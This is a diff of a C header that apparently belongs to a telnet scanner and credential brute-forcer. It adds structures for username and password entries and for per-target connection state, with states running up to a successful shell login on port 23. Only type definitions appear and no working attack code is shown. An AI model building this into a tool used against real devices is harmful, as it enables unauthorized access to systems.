@@ -4,10 +4,12 @@
 #define scan_port 23
 
 #include "customize.h"
-struct host_info{
-	ipv4_t ipaddr;
-	uint16_t port;
-}; 
+struct auth_entry {
+	char* username;
+	char* password;
+	int name_len;
+	int pass_len;
+};
 
 typedef enum {
 	SOCKET_CLOSED,
@@ -19,6 +21,19 @@ typedef enum {
 	TELNET_VERIFY_SH,
 	TELNET_LOGIN_SUCCESS
 } status;
+
+struct target{
+	uint8_t data_buf[512];
+	int data_len;
+	int cfd;
+	int last_start_time;
+	int try_times;
+	uint16_t port;
+	ipv4_t ipaddr;
+	status state;
+	struct auth_entry *auth;
+	int (*function)(struct target *conn);
+}; 
 
 #define PER_TIME_MAX 128
 #define MAX_CONNECTION	128
